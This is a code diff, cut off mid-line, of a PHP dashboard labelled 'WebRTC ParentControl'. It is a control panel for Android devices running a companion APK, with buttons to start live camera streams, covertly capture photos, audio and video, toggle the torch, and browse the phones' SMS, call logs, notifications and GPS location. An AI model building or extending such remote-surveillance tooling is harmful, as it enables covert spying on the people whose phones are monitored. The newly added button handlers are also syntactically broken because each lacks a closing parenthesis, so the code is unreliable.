@@ -1,203 +1,153 @@
 <?php
-if (!file_exists(__DIR__ . '/config.php')) {
-    header('Location: install.php');
-    exit;
-}
+session_start();
 require_once 'config.php';
 
 if (!isset($_SESSION['admin_id'])) {
-    header('Location: login.php');
-    exit;
+    header('Location: login.php'); exit;
 }
 
 try {
-    $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4", DB_USER, DB_PASS, [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
-    ]);
-} catch (Exception $e) {
-    die('DB Connection failed: ' . $e->getMessage());
+    $pdo = new PDO(
+        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4',
+        DB_USER, DB_PASS,
+        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
+    );
+
+    // Auto-cleanup expired media
+    $pdo->exec('DELETE FROM media_captures WHERE expires_at IS NOT NULL AND expires_at < NOW()');
+
+    // Stats
+    $totalDevices = $pdo->query('SELECT COUNT(*) FROM devices')->fetchColumn();
+    $totalImages  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='image'")->fetchColumn();
+    $totalAudios  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='audio'")->fetchColumn();
+    $totalVideos  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='video'")->fetchColumn();
+
+    $devices = $pdo->query('SELECT * FROM devices ORDER BY last_seen DESC LIMIT 50')->fetchAll(PDO::FETCH_ASSOC);
+    $media   = $pdo->query('SELECT * FROM media_captures ORDER BY captured_at DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
+} catch (PDOException $e) {
+    die('<h2 style="color:red">DB Error: ' . htmlspecialchars($e->getMessage()) . '</h2>');
 }
 
-// Auto-delete expired media
-$pdo->exec("DELETE FROM media_captures WHERE expires_at IS NOT NULL AND expires_at < NOW()");
-
-// Stats
-$devices = $pdo->query("SELECT COUNT(*) FROM devices")->fetchColumn();
-$images  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='image'")->fetchColumn();
-$audios  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='audio'")->fetchColumn();
-$videos  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='video'")->fetchColumn();
-
-$device_list = $pdo->query("SELECT * FROM devices ORDER BY last_seen DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
-$recent_media = $pdo->query("SELECT * FROM media_captures ORDER BY captured_at DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+// FIX Bug 13 — Use json_encode to safely escape NODE_BACKEND_URL into JS
+$nodeUrlJs = json_encode(NODE_BACKEND_URL);
+$uploadToken = defined('UPLOAD_TOKEN') ? json_encode(UPLOAD_TOKEN) : json_encode('');
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ParentControl Dashboard</title>
-<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebRTC ParentControl Dashboard</title>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}
-.header{background:#161b22;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d}
-.header h1{color:#58a6ff;font-size:1.4rem}a.logout{color:#f85149;text-decoration:none;font-size:.9rem}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;padding:1.5rem 2rem}
-.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.2rem;text-align:center}
-.stat h3{font-size:2rem;color:#58a6ff}.stat p{color:#8b949e;font-size:.85rem;margin-top:.4rem}
-.section{padding:0 2rem 2rem}
-.section h2{color:#f0f6fc;font-size:1.1rem;margin-bottom:1rem;border-bottom:1px solid #30363d;padding-bottom:.5rem}
-.devices{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem}
-.device-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem}
-.device-card h4{color:#58a6ff;margin-bottom:.5rem}
-.device-card p{color:#8b949e;font-size:.8rem;margin:.2rem 0}
-.btn{display:inline-block;padding:6px 12px;border-radius:6px;border:none;cursor:pointer;font-size:.8rem;margin:3px 2px}
-.btn-blue{background:#1f6feb;color:#fff}.btn-green{background:#238636;color:#fff}.btn-red{background:#da3633;color:#fff}.btn-orange{background:#e3a81a;color:#fff}
-.media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem}
-.media-card{background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden}
-.media-card img{width:100%;height:130px;object-fit:cover}
-.media-card audio,.media-card video{width:100%}
-.media-card .info{padding:.6rem;font-size:.75rem;color:#8b949e}
-.media-card .info strong{color:#e6edf3;display:block;margin-bottom:2px}
-.live-view{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem}
-.live-view video{width:100%;border-radius:6px;background:#000;max-height:400px}
-#status-bar{background:#1c2128;padding:.5rem 2rem;font-size:.8rem;color:#8b949e;border-bottom:1px solid #30363d}
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family: 'Segoe UI', sans-serif; background:#1a1a2e; color:#eee; }
+  .navbar { background:#16213e; padding:14px 24px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #e94560; }
+  .navbar h1 { color:#e94560; font-size:20px; }
+  .nav-links a { color:#aaa; text-decoration:none; margin-left:16px; font-size:14px; }
+  .nav-links a:hover { color:#e94560; }
+  .container { padding:24px; max-width:1400px; margin:0 auto; }
+  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:28px; }
+  .stat-card { background:#16213e; border-radius:10px; padding:20px; text-align:center; border:1px solid #0f3460; }
+  .stat-card .num { font-size:32px; color:#e94560; font-weight:bold; }
+  .stat-card .label { font-size:13px; color:#888; margin-top:4px; }
+  .section-title { font-size:18px; color:#e94560; margin:24px 0 12px; border-bottom:1px solid #0f3460; padding-bottom:8px; }
+  .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:16px; }
+  .device-card { background:#16213e; border-radius:10px; padding:20px; border:2px solid #0f3460; transition:border-color 0.3s; }
+  .device-card.online { border-color:#27ae60; }
+  .device-card h3 { font-size:14px; color:#eee; margin-bottom:4px; word-break:break-all; }
+  .device-card .ts { font-size:11px; color:#666; margin-bottom:14px; }
+  .btn-row { display:flex; flex-wrap:wrap; gap:6px; }
+  .btn { padding:7px 12px; border:none; border-radius:6px; cursor:pointer; font-size:12px; font-weight:bold; }
+  .btn-live  { background:#e94560; color:#fff; }
+  .btn-photo { background:#3498db; color:#fff; }
+  .btn-audio { background:#9b59b6; color:#fff; }
+  .btn-video { background:#e67e22; color:#fff; }
+  .btn-torch { background:#f1c40f; color:#333; }
+  .btn:hover { opacity:0.85; }
+  #live-section { background:#16213e; border-radius:10px; padding:20px; margin:24px 0; display:none; }
+  #remote-video { width:100%; max-width:720px; border-radius:8px; background:#000; display:block; margin:0 auto; }
+  .tabs { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
+  .tab { padding:8px 18px; border-radius:6px; cursor:pointer; font-size:13px; background:#0f3460; color:#aaa; border:none; }
+  .tab.active { background:#e94560; color:#fff; }
+  .tab-content { display:none; }
+  .tab-content.active { display:block; }
+  .media-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:14px; }
+  .media-card { background:#0f3460; border-radius:8px; overflow:hidden; }
+  .media-card img, .media-card video { width:100%; display:block; max-height:160px; object-fit:cover; }
+  .media-card audio { width:100%; padding:8px; }
+  .media-info { padding:10px; font-size:11px; color:#aaa; }
+  .media-info .dev { color:#e94560; font-weight:bold; }
+  .media-actions { display:flex; gap:6px; padding:0 10px 10px; }
+  .media-actions a, .media-actions button { font-size:11px; padding:4px 10px; border-radius:4px; text-decoration:none; border:none; cursor:pointer; }
+  .media-actions a { background:#27ae60; color:#fff; }
+  .media-actions button { background:#c0392b; color:#fff; }
+  #sms-feed, #call-feed, #notif-feed { max-height:400px; overflow-y:auto; }
+  .sms-item, .call-item, .notif-item { background:#0f3460; border-radius:6px; padding:12px; margin-bottom:8px; font-size:13px; }
+  .sms-item .from { color:#3498db; font-weight:bold; }
+  .call-item .number { color:#27ae60; font-weight:bold; }
+  .notif-item .app { color:#e67e22; font-weight:bold; }
+  #gps-map { width:100%; height:400px; border-radius:8px; background:#0f3460; display:flex; align-items:center; justify-content:center; color:#888; }
+  #gps-coords { font-size:13px; color:#aaa; margin-bottom:10px; }
+  .status-bar { background:#16213e; padding:8px 24px; font-size:12px; color:#888; border-top:1px solid #0f3460; position:fixed; bottom:0; left:0; right:0; }
+  .status-bar span { margin-right:20px; }
+  #conn-status { color:#e94560; }
+  @media(max-width:600px) { .stats { grid-template-columns:repeat(2,1fr); } }
 </style>
 </head>
 <body>
-<div class="header">
-  <h1>📱 ParentControl Dashboard</h1>
-  <a href="logout.php" class="logout">Logout</a>
-</div>
-<div id="status-bar">🔌 Connecting to signaling server...</div>
-<div class="stats">
-  <div class="stat"><h3><?= $devices ?></h3><p>Devices</p></div>
-  <div class="stat"><h3><?= $images ?></h3><p>Images Captured</p></div>
-  <div class="stat"><h3><?= $audios ?></h3><p>Audio Clips</p></div>
-  <div class="stat"><h3><?= $videos ?></h3><p>Videos Captured</p></div>
-</div>
 
-<div class="section">
-  <h2>📡 Connected Devices</h2>
-  <div class="devices" id="device-list">
-    <?php foreach ($device_list as $d): ?>
-    <div class="device-card" id="dev-<?= htmlspecialchars($d['device_id']) ?>">
-      <h4><?= htmlspecialchars($d['device_name'] ?? $d['device_id']) ?></h4>
-      <p>Last seen: <?= $d['last_seen'] ?? 'Never' ?></p>
-      <p>ID: <?= htmlspecialchars($d['device_id']) ?></p>
-      <button class="btn btn-blue" onclick="startLive('<?= htmlspecialchars($d['device_id']) ?>')">▶ Live View</button>
-      <button class="btn btn-green" onclick="captureImage('<?= htmlspecialchars($d['device_id']) ?>')">📷 Photo</button>
-      <button class="btn btn-orange" onclick="captureAudio('<?= htmlspecialchars($d['device_id']) ?>')">🎤 Audio</button>
-      <button class="btn btn-red" onclick="captureVideo('<?= htmlspecialchars($d['device_id']) ?>')">🎬 Video</button>
-    </div>
-    <?php endforeach; ?>
+<div class="navbar">
+  <h1>📱 WebRTC ParentControl</h1>
+  <div class="nav-links">
+    <a href="#">Dashboard</a>
+    <a href="logout.php">🚪 Logout (<?= htmlspecialchars($_SESSION['admin_user'] ?? 'admin') ?>)</a>
   </div>
 </div>
 
-<div class="section" id="live-section" style="display:none">
-  <h2>📺 Live View</h2>
-  <div class="live-view">
-    <video id="remote-video" autoplay playsinline muted></video>
-  </div>
-  <button class="btn btn-red" onclick="stopLive()">⛔ Stop Live</button>
-</div>
+<div class="container">
 
-<div class="section">
-  <h2>🗂 Captured Media (Temporary – auto-delete after 24h)</h2>
-  <div class="media-grid">
-    <?php foreach ($recent_media as $m): ?>
-    <div class="media-card">
-      <?php
-      $url = 'uploads/' . htmlspecialchars(basename($m['file_path']));
-      if ($m['media_type'] === 'image'):
-      ?>
-        <img src="<?= $url ?>" alt="capture" onerror="this.src='data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><text y=\'20\'>No Preview</text></svg>'">
-      <?php elseif ($m['media_type'] === 'audio'): ?>
-        <div style="padding:1rem"><audio controls src="<?= $url ?>"></audio></div>
-      <?php elseif ($m['media_type'] === 'video'): ?>
-        <video controls src="<?= $url ?>" style="width:100%;max-height:130px"></video>
-      <?php endif; ?>
-      <div class="info">
-        <strong><?= ucfirst($m['media_type']) ?> – <?= htmlspecialchars($m['device_id']) ?></strong>
-        <?= date('d M Y H:i', strtotime($m['captured_at'])) ?>
-        <a href="<?= $url ?>" download style="color:#58a6ff;margin-left:6px">⬇</a>
-        <a href="delete_media.php?id=<?= $m['id'] ?>" style="color:#f85149;margin-left:6px" onclick="return confirm('Delete?')">🗑</a>
+  <!-- Stats -->
+  <div class="stats">
+    <div class="stat-card"><div class="num"><?= $totalDevices ?></div><div class="label">📱 Devices</div></div>
+    <div class="stat-card"><div class="num"><?= $totalImages ?></div><div class="label">📷 Images</div></div>
+    <div class="stat-card"><div class="num"><?= $totalAudios ?></div><div class="label">🎤 Audio</div></div>
+    <div class="stat-card"><div class="num"><?= $totalVideos ?></div><div class="label">🎬 Video</div></div>
+  </div>
+
+  <!-- Connected Devices -->
+  <div class="section-title">📱 Connected Devices</div>
+  <div class="device-grid" id="device-grid">
+    <?php foreach ($devices as $dev): ?>
+    <div class="device-card" id="card-<?= htmlspecialchars($dev['device_id']) ?>">
+      <h3><?= htmlspecialchars($dev['device_id']) ?></h3>
+      <div class="ts">Last seen: <?= htmlspecialchars($dev['last_seen'] ?? 'Never') ?></div>
+      <div class="btn-row">
+        <button class="btn btn-live"  onclick="startLive('<?= htmlspecialchars($dev['device_id']) ?>'">▶ Live</button>
+        <button class="btn btn-photo" onclick="captureImage('<?= htmlspecialchars($dev['device_id']) ?>'">📷 Photo</button>
+        <button class="btn btn-audio" onclick="captureAudio('<?= htmlspecialchars($dev['device_id']) ?>'">🎤 Audio</button>
+        <button class="btn btn-video" onclick="captureVideo('<?= htmlspecialchars($dev['device_id']) ?>'">🎬 Video</button>
+        <button class="btn btn-torch" onclick="toggleTorch('<?= htmlspecialchars($dev['device_id']) ?>'">🔦 Torch</button>
       </div>
     </div>
     <?php endforeach; ?>
+    <?php if (empty($devices)): ?>
+    <div style="color:#666; font-size:13px; padding:20px;">No devices connected yet. Install the APK on a device to begin.</div>
+    <?php endif; ?>
   </div>
-</div>
 
-<script>
-const NODE_URL = '<?= NODE_BACKEND_URL ?>';
-const socket = io(NODE_URL, { reconnection: true, reconnectionDelay: 2000, reconnectionAttempts: Infinity });
-let peerConnection = null, currentDeviceId = null;
+  <!-- Live View -->
+  <div id="live-section">
+    <div class="section-title">📺 Live View — <span id="live-device-label"></span>
+      <button onclick="stopLive()" style="float:right;background:#e94560;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;">Stop</button>
+    </div>
+    <video id="remote-video" autoplay playsinline controls></video>
+  </div>
 
-socket.on('connect', () => {
-  document.getElementById('status-bar').textContent = '✅ Connected to signaling server';
-  socket.emit('join-as-controller', { deviceId: '__none__' });
-});
-socket.on('disconnect', () => {
-  document.getElementById('status-bar').textContent = '🔴 Disconnected – reconnecting...';
-});
-socket.on('device-list-update', (devices) => {
-  // Mark online devices
-  devices.forEach(id => {
-    const card = document.getElementById('dev-' + id);
-    if (card) card.style.borderColor = '#238636';
-  });
-});
-
-// Live WebRTC
-async function startLive(deviceId) {
-  currentDeviceId = deviceId;
-  document.getElementById('live-section').style.display = 'block';
-  socket.emit('join-as-controller', { deviceId });
-  const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-  peerConnection = new RTCPeerConnection(config);
-  peerConnection.ontrack = e => { document.getElementById('remote-video').srcObject = e.streams[0]; };
-  peerConnection.onicecandidate = e => { if (e.candidate) socket.emit('ice-candidate', { to: deviceId, candidate: e.candidate }); };
-}
-
-socket.on('offer', async (data) => {
-  if (!peerConnection) return;
-  await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
-  const answer = await peerConnection.createAnswer();
-  await peerConnection.setLocalDescription(answer);
-  socket.emit('answer', { to: data.from, sdp: answer });
-});
-socket.on('ice-candidate', async (data) => {
-  if (peerConnection) await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-});
-
-function stopLive() {
-  if (peerConnection) { peerConnection.close(); peerConnection = null; }
-  document.getElementById('remote-video').srcObject = null;
-  document.getElementById('live-section').style.display = 'none';
-}
-
-function captureImage(deviceId) { socket.emit('capture-image', { deviceId, camera: 'front' }); alert('Image capture command sent!'); }
-function captureAudio(deviceId) { socket.emit('capture-audio', { deviceId, duration: 10 }); alert('Audio capture (10s) command sent!'); }
-function captureVideo(deviceId) { socket.emit('capture-video', { deviceId, duration: 15, camera: 'back' }); alert('Video capture (15s) command sent!'); }
-
-// Receive base64 media from Android via Node, upload to PHP
-socket.on('media-ready', (data) => {
-  const formData = new FormData();
-  const blob = b64toBlob(data.base64, data.mimeType);
-  formData.append('file', blob, data.filename);
-  formData.append('device_id', data.deviceId);
-  formData.append('media_type', data.type);
-  fetch('upload_media.php', { method: 'POST', body: formData })
-    .then(r => r.json())
-    .then(res => { if (res.success) location.reload(); })
-    .catch(console.error);
-});
-
-function b64toBlob(b64, mime) {
-  const bytes = atob(b64), arr = new Uint8Array(bytes.length);
-  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
-  return new Blob([arr], { type: mime });
-}
-</script>
-</body>
-</html>
+  <!-- Data Tabs -->
+  <div class="section-title">📁 Data & Media</div>
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('media')">📸 Media Gallery</button>
+    <button class="tab" onclick="switchTab('sms')">💬 SMS</button>
+    <button class="tab" onclick="switchTab('calls')">📞 Calls</button>
+    <button class="tab" onclick="swi
